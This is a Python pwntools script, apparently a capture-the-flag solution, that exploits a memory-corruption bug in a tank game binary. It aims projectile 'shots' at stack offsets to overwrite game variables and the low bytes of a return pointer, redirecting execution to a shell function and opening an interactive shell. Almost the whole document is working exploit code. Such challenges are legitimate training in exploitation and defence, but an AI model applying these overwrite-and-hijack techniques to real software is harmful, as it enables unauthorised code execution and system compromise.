from math import sqrt, pi, sin, cos
from pwn import *
from time import sleep

def calculateRequiredPowerForDest(target, desired_angle):
    return (((sqrt((target + 0.5)) * sqrt(9.81))) / sqrt(sin(2 * ((pi * desired_angle) / 180))))

def calculateProjectileLandingPoint(v0, theta):
    g = 9.81

    thetaRad = theta * pi / 180.0

    vx = v0 * cos(thetaRad)
    vy = v0 * sin(thetaRad)

    t = (2.0 * vy) / g

    x = vx * t
    return x

def fire_shot(p, power, angle, ammo_type = 1, load_byte=b'A'):
    print("input: power {}, angle {} ammo_type {}".format(power, angle, ammo_type))
    first_line = p.recvline()
    if first_line == b"Hit Streak! 1 specialty ammo granted\n":
        first_line = p.recvline()
        print("+1 specialty ammo")

    if first_line == b"Select ammo type:\n":
        p.recvline() # 1: _
        p.recvline() # 2: - 
        p.sendline(bytes(str(ammo_type), "UTF-8"))
        p.recvline() # Enter power: 
    
    p.sendline(bytes(str(power), "UTF-8"))
    p.recvline() # Enter angle:
    p.sendline(bytes(str(angle), "UTF-8"))

    p.recvline() # Projectile will land at... 
    p.recvline() # fire when ready!
    p.sendline(b"pew!AA" + load_byte)
    p.sendline(b"pew!")
    p.recvline() # Direct hit!
    p.recvline() # \n

    
def parse_ui(p):

    main_ui = p.recvuntil(bytes("|100m\n", "UTF-8"))
    field = main_ui.split(b"\n")[3][9:]
    return field.index(b'E')

    
def shoot_enemy(p, times):
    for i in range(times):
        target = parse_ui(p)
        required_power = calculateRequiredPowerForDest(target, 45)
        fire_shot(p, required_power, 45, 1)

# p = remote('localhost', 1234)
p = process('super-sick-tank-game')
max_angle_off = -0x4
max_power_off = 0x70


# welcome line
p.recvline()

# build up some special ammo
shoot_enemy(p, 10)

# overwrite angle to shoot backwards
parse_ui(p)
fire_shot(p, 0, 0, 2)

# overwrite 1 byte of power to shoot further
parse_ui(p)
fire_shot(p, int(calculateRequiredPowerForDest(max_power_off, 45)), 45, 2)

# overwrite the rest of max_power to shoot past 45
# we don't need THAT much health so just overwrite the least significant byte
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(max_power_off + 2, 45), 45, 2)

# overwrite max_misses to increase health by '_'
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x11c, 45), 135, 1)

# overwrite most significant byte of num_ammo_types so we can use pretty much anything above it on the stack as "ammo"
# also load in the 2nd LSB for the return pointer for next round
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x115, 45), 135, 1, b'\xe6')

# free shell function LSB
# also load in the LSB for the return pointer for next round
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x90, 45), 45, 9, b'\x13')

# free shell function second LSB
parse_ui(p)
fire_shot(p, calculateRequiredPowerForDest(0x91, 45), 45, 9)

# use up all the remaining lives. can technically just set remaining lives to 0 but i'm way too lazy
for i in range(87):
    parse_ui(p)
    fire_shot(p, 0, 45, 1)

# gdb.attach(p)
p.interactive()
